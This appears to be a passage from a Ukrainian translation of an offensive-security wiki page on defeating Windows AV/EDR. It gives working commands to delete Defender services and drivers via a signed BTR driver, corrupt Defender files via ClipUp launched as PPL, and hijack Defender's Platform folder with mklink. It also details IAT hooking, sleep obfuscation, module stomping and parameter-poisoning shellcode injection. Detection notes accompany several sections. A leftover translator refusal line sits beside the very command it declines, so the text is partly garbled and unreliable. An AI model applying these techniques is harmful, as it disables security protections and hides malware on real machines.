| 6 | `[Flags][тип][розмір][шлях до ключа + "\\" + значення][дані]` | Створити/оновити значення реєстру та створити відсутні шляхи ключів |

Для дій 5 і 6 роздільник ключа/значення у форматі on-wire — це **два зворотні слеші поспіль**; шлях у звичайному форматі не буде розділено належним чином. Файл зворотного зв’язку здебільшого повторює запит, але перші чотири байти даних кожного елемента стають його результуючим `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля flags, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Процес `BTR_CLI` та вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв’язку, серіалізує/контролює контрольні суми/шифрує ланцюжок дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер як драйвер із типом запуску system-start для `-trigger boot`. Пряме внесення даних до реєстру оминає звичайний шлях SCM `CreateServiceW`, а отже, **не** генерує подію встановлення служби Event ID 7045. Артефакти, створені для запуску під час завантаження, згодом можна видалити командою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` до готовності стека зберігання та посилання `SystemRoot`. Натомість `Start=1` разом із групою високого пріоритету `Boot Bus Extender` забезпечує виконання на Phase 1: NTFS уже доступна, але багато драйверів безпеки з типом запуску System-start і служб EDR у user mode ще не ініціалізовані. Фільтри з типом запуску Boot-start, як-от `WdFilter`, можуть бути вже завантажені, але BTR може видалити їхні двійкові файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до того, як їх запустить SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання драйверів Boot-start і має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в одній транзакції. У PoC перед дією 1 додається дія для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, а потім обробляє власний запит на видалення та прибирає його перед вивантаженням. Це зменшує обсяг доказів, а збереження зворотного зв’язку в `<random>.sys:<random>.dat` дає змогу разом видалити драйвер і обидва потоки даних.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції для виявлення з високою достовірністю

Правила, що спираються лише на підписи, та список заблокованих уразливих драйверів Microsoft не протидіють зловживанню штатними можливостями BTR. Надавайте перевагу наведеним поведінковим кореляціям, відрізняючи легітимне походження Defender від запуску довільним процесом.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є типовим для підготовки BTR. Потік даних ADS `.dat`, пов’язаний із тим самим `.sys`, є особливо підозрілим, оскільки легітимний Defender зазвичай зберігає зворотний зв’язок у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте безпосереднє створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>` із параметром `Args=...:changelist` і `Group=Boot Bus Extender`, якщо немає відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR із процесу, що не належить до Defender, із подальшим видаленням файлів, яке приписується `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення й видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте та аудіюйте призначення/увімкнення `SeLoadDriverPrivilege`; одного лише підпису Microsoft недостатньо, щоб вважати драйвер надійним, якщо драйвер засобу безпеки підготовлено через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписантів і рівнів, щоб процеси могли втручатися лише в процеси з таким самим або нижчим рівнем захисту. Для атакувальника, якщо вдається легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, штатні можливості (наприклад, ведення журналу) можна перетворити на обмежений механізм запису, захищений PPL, для роботи із захищеними каталогами, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес запускався як PPL
- Цільовий EXE (і всі завантажені DLL) має бути підписаний із EKU, сумісним із PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписанту бінарного файла (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписантів antimalware, `PROTECTION_LEVEL_WINDOWS` для підписантів Windows). Невідповідні рівні призведуть до помилки створення.

Також див. ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Не можу перекладати покрокові інструкції з обходу захисту Defender і пошкодження його файлів. Можу допомогти перетворити цей матеріал на безпечний опис ризику та заходів виявлення для захисної документації.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp; примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Щоб установити/запустити службу, потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Час має вирішальне значення: цільовий файл не повинен бути відкритим; запуск під час завантаження системи дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` із незвичними аргументами, особливо якщо його батьківський процес — нестандартний засіб запуску, під час завантаження системи або поблизу цього часу.
- Нові служби, налаштовані на автоматичний запуск підозрілих двійкових файлів і стабільний запуск раніше за Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів двійкових файлів Defender/каталогів Platform; неочікуване створення/зміна файлів процесами з прапорцями захищеного процесу.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівнів PPL двійковими файлами, що не належать до AV.

Заходи пом’якшення
- WDAC/Code Integrity: обмежте, які підписані двійкові файли можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від втручання Defender і засоби захисту на ранньому етапі завантаження ввімкнені; перевіряйте помилки запуску, які вказують на пошкодження двійкового файлу.
- За потреби розгляньте вимкнення створення коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно перевірте сумісність).

## Втручання в Microsoft Defender через захоплення Symlink Hijack папки версії Platform

Windows Defender визначає платформу для запуску, перелічуючи підпапки в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служб/реєстру). Під час вибору враховуються записи каталогів, зокрема точки повторної обробки каталогів (символьні посилання). Адміністратор може скористатися цим, щоб перенаправити Defender на шлях, доступний для запису зловмиснику, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/символьних посилань у папці Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані засоби (mklink)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає версію з найвищим лексикографічним значенням, не перевіряючи, чи вказує ціль на захищений/довірений шлях.

Покроково (приклад)
1) Підготуйте доступну для запису копію поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть усередині Platform символічне посилання на каталог із вищою версією, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слід спостерігати за новим шляхом процесу в `C:\TMP\AV\` і конфігурацією служби/реєстром, де має бути вказано це розташування.

Варіанти post-exploitation
- DLL sideloading/виконання коду: розмістіть/замініть DLL, які Defender завантажує з каталогу програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видаліть symlink версії, щоб під час наступного запуску налаштований шлях не вказував на ціль, і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для неї потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team може перенести runtime-ухилення з C2-імпланта безпосередньо в цільовий модуль, перехопивши його Import Address Table (IAT) і перенаправивши вибрані API через контрольований зловмисником position-independent code (PIC). Це поширює ухилення за межі невеликого набору API, доступного в багатьох наборах інструментів (наприклад, CreateProcessA), і забезпечує такий самий захист для BOF і post-exploitation DLL.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC-блоб поруч із цільовим модулем за допомогою reflective loader (перед ним або як супутній файл). PIC має бути самодостатнім і незалежним від розташування.
- Під час завантаження host DLL перегляньте її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC-обгортки.
- Кожна PIC-обгортка виконує ухилення перед передаванням керування реальній адресі API. Типові прийоми ухилення:
  - Маскування/зняття маскування пам’яті навколо виклику (наприклад, шифрування областей beacon, зміна RWX→RX, назв/дозволів сторінок), а потім відновлення після виклику.
  - Підміна call stack: створіть нешкідливий стек і перейдіть до цільового API так, щоб аналіз call stack визначив очікувані кадри.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або еквівалент) міг реєструвати API для перехоплення в Beacon, BOF і post-ex DLL.

Навіщо тут потрібен IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений імпорт, не потребуючи змін у коді інструмента чи проксіювання конкретних API через Beacon.
- Охоплює post-ex DLL: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати до їхніх викликів API ті самі прийоми маскування та ухилення від аналізу стека.
- Завдяки обгортанню CreateProcessA/W відновлює надійне використання post-ex команд для створення процесів проти засобів виявлення на основі call stack.

Мінімальний ескіз IAT hook (псевдокод на x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте patch після relocations/ASLR і до першого використання import. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers невеликими й сумісними з PIC; знаходьте справжній API через початкове значення IAT, збережене до patching, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки з одночасними правами на запис і виконання.

Заглушка для call-stack spoofing
- PIC stubs у стилі Draugr створюють фальшивий ланцюжок викликів (return addresses у нешкідливих модулях), а потім передають керування справжньому API.
- Це обходить виявлення, яке очікує канонічні стеки від Beacon/BOFs під час виклику чутливих API.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб опинитися в очікуваних фреймах перед prologue API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро отримували ту саму evasion path без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза image (heap/anon); періодична перевірка import pointers.
- Аномалії стека: return addresses, що не належать завантаженим images; різкі переходи до non-image PIC; невідповідна ancestry RtlUserThreadStart.
- Телеметрія loader: запис у IAT зсередини процесу, рання активність DllMain, що змінює import thunks, неочікувані RX regions, створені під час завантаження.
- Уникнення image-load виявлення: якщо виконується hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks маскування пам’яті (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC stubs для call-stack spoofing (наприклад, Draugr)


## IAT hooking під час імпорту + обфускація сну (Crystal Palace/PICO)

### IAT hooks під час імпорту через resident PICO

Якщо ви контролюєте reflective loader, можна встановлювати hooks **під час** `ProcessImports()`, замінивши вказівник loader на `GetProcAddress` власним resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який зберігається після того, як тимчасовий loader PIC звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hooks на основі hash, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, поверніть його; інакше передайте виклик справжньому `GetProcAddress`.
- Реєструйте цільові hooks під час лінкування через записи Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається чинним, бо розміщений усередині resident PICO.

Це забезпечує **перенаправлення IAT під час імпорту** без patching секції коду завантаженої DLL після завантаження.

### Як змусити імпорти, придатні для hooking, коли ціль використовує PEB-walking

Hooks під час імпорту спрацьовують лише тоді, коли функція фактично є в IAT цілі. Якщо модуль отримує адреси API через PEB-walk + hash (без import entry), примусово додайте справжній import, щоб loader обробив його через `ProcessImports()`:

- Замініть пошук hashed export (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор згенерує запис IAT, що дасть змогу перехопити виклик, коли reflective loader розв’язуватиме імпорти.

### Обфускація сну/простою в стилі Ekko без patching `Sleep()`

Замість patching `Sleep` встановлюйте hooks на **фактичні примітиви очікування/IPC**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок обфускації в стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer`, щоб запланувати послідовність callbacks, які викликають `NtContinue` з підготовленими фреймами `CONTEXT`.
- Типовий ланцюжок (x64): установити для образу `PAGE_READWRITE` → зашифрувати RC4 весь зіставлений образ через `advapi32!SystemFunction032` → виконати блокувальне очікування → розшифрувати RC4 → **відновити права для кожної секції**, пройшовши PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька фреймів і задайте регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалого очікування (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив роботу, поки образ замаскований. Цей підхід приховує модуль від сканерів під час періодів простою й уникає класичного сигнатурного сліду “patched `Sleep()`”.

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суцільних буферів розміром з образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням власних прав для кожної секції.

### Runtime-реєстрація CFG для gadget-ів обфускації сну

У цілях із CFG перший непрямий перехід до gadget-а всередині функції, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай призводить до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб ланцюжки в стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте кожну непряму ціль переходу, яку використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси image** і охоплювати **повний розмір image**.
- Для вручну зіставлених/PIC/stomped regions використовуйте **базову адресу allocation** і його розмір.
- Позначайте не лише dispatch gadget, а й exports, до яких переходять непрямо (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які executable sections під контролем атакувальника, що стануть непрямими цілями.

Це перетворює sleep chains у стилі ROP/JOP із прийому, що “працює лише в процесах без CFG”, на повторно використовуваний примітив для `explorer.exe`, браузерів, `svchost.exe` та інших endpoint-ів, скомпільованих із `/guard:cf`.

### CET-сумісний stack spoofing для потоків у режимі сну

Повна заміна `CONTEXT` помітна й може не працювати в системах із CET Shadow Stack, оскільки підмінений `Rip` має узгоджуватися з апаратним shadow stack. Безпечніший шаблон маскування сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі та прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть копію справжнього TEB/TIB поточного потоку.
- Зафіксуйте справжній контекст потоку, що засинає, через `GetThreadContext`.
- Скопіюйте **лише** справжній `Rip` у підмінений контекст, залишивши підмінені `Rsp`/стан стека без змін.
- Під час сну скопіюйте `NT_TIB` підміненого потоку в TEB поточного потоку, щоб stack walkers розмотували стек у межах легітимного діапазону.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає узгоджений із CET instruction pointer, водночас вводячи в оману EDR stack walkers, які довіряють метаданим стека TEB під час перевірки розмотування стека.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer queue надто впізнаваний, ту саму послідовність sleep-encrypt-spoof-restore можна виконати із призупиненого helper thread за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Поставте в чергу підготовлені фрейми `CONTEXT`/APCs через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку helper thread, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про початок і заблокуватися.
- Призупиніть основний потік перед відновленням TIB/контексту (`NtSuspendThread` → відновлення → `NtResumeThread`), щоб зменшити період гонки, коли сканер може виявити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру helper-thread/APC, зберігаючи ті самі цілі RC4-маскування та stack spoofing.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до сну, очікування або APC dispatch.
- Виклики `GetThreadContext`/`SetThreadContext`, обгорнуті навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, за яким ідуть прямі записи в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, що непрямо викликають `SystemFunction032`, `VirtualProtect` або helpers відновлення прав секцій.
- Повторне використання коротких сигнатур gadget-ів, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині підписаних модулів.


## Точний Module Stomping

Module stomping виконує payload із **секції `.text` DLL, уже зіставленої в цільовому процесі**, замість виділення очевидної приватної executable memory або завантаження нової sacrificial DLL. Ціллю для перезапису має бути **завантажений disk-backed image**, чиїх областей коду достатньо для payload, щоб не пошкодити шляхи виконання, які процес іще використовує.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, наприклад `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а надто мала область коду призведе до збою процесу. Надійніший робочий процес:

1. Перелічіть модулі цільового процесу та залиште **список включення лише з назвами** вже завантажених DLL.
2. Спершу створіть payload і зафіксуйте його **точний розмір у байтах**.
3. Перегляньте DLL-кандидати на диску та порівняйте PE section **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за розмір файлу, оскільки показує розмір executable section **після зіставлення в пам’ять**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Оцініть **радіус ураження**: якщо payload перевищує межі вибраної функції, він перезапише сусідні exports, розташовані після неї в пам’яті.

Типові допоміжні інструменти для recon/вибору цілі, що трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Нотатки з експлуатації
- Віддавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary` / неочікуваного завантаження образів.
- Віддавайте перевагу export-функціям, які цільова програма викликає рідко, інакше звичайні шляхи виконання можуть звернутися до змінених байтів до або після створення потоку.
- Для великих implants часто потрібно замінити вбудовування shellcode як рядкового літерала на **масив байтів/ініціалізатор у фігурних дужках**, щоб у вихідному коді injector було правильно представлено весь буфер.

Ідеї для виявлення
- Віддалений запис у виконувані сторінки, прив’язані до образу (`MEM_IMAGE`, `PAGE_EXECUTE*`), а не в поширеніші приватні виділення RWX/RX.
- Точки входу export-функцій, чиї байти в пам’яті більше не збігаються з відповідними байтами у файлі на диску.
- Віддалені потоки або переходи контексту, що починають виконання всередині export-функції легітимної DLL, перші байти якої нещодавно змінили.
- Підозрілі послідовності викликів `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL, після яких створюється потік.

## Отруєння параметрів процесу (P3)

Отруєння параметрів процесу (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка не використовує класичний шлях віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує той факт, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії даних, які можна отруїти та які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW`; його довжина обмежена **32 767 символами Unicode** разом із кінцевим нульовим символом.
- `lpEnvironment` має бути блоком середовища Unicode з послідовних рядків `NAME=VALUE\0`, що закінчується додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною документованою домовленістю.

Так звичайне створення процесу перетворюється на **примітив передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску, а Windows виконує копіювання між процесами.

### Потік пошуку у віддаленому процесі без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримайте `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитайте віддалений `PEB`
3. Перейдіть за вказівником `PEB.ProcessParameters`
4. Прочитайте `RTL_USER_PROCESS_PARAMETERS`
5. Використайте вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік виконання:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не виконується. Типовий ланцюжок P3:

1. Створити процес звичайним способом (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, для цього **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор повернутого головного потоку.

Це дозволяє уникнути кількох API, за якими зазвичай стежать під час ін’єкцій:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та багатоступеневий shellcode

Усі три носії — це **рядкові або подібні до рядків дані**, тому під час передавання необроблене корисне навантаження, що містить `0x00`, обрізається. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий варіант — синтезування констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This дозволяє першому етапу створювати рядки в стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в переданий параметр.

### Виклики API зі стеку з першого етапу

Коли першому етапу потрібно викликати API, як-от `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтову shadow space x64**
- встановити `RCX`, `RDX`, `R8`, `R9` у константи або вказівники відносно `RSP`
- забезпечити **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стеку в область пам’яті з дозволом `PAGE_READWRITE`, змінити її дозвіл на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати їй керування, уникаючи прямого виділення пам’яті з дозволами RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які надають сторінкам параметрів процесу дозвіл на виконання
- зміна захисту, за якою слідує `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для міжпроцесного передавання даних**, а не самостійний примітив виконання: скопійованому параметру все ще потрібна зміна дозволу на виконання та спосіб перенаправлення виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього підходу, оскільки він внутрішньо використовує підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Console STDIN pipe injection

Інтерактивний дочірній процес консолі також можна використати як **примітив передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу на pipe і надсилає маркер, за яким іде shellcode. Коли консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому дозвіл на виконання та перенаправляє на нього потік дочірнього процесу. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно є process injection, а не універсальним обходом EDR.<sup>[[41]](#references)</sup>

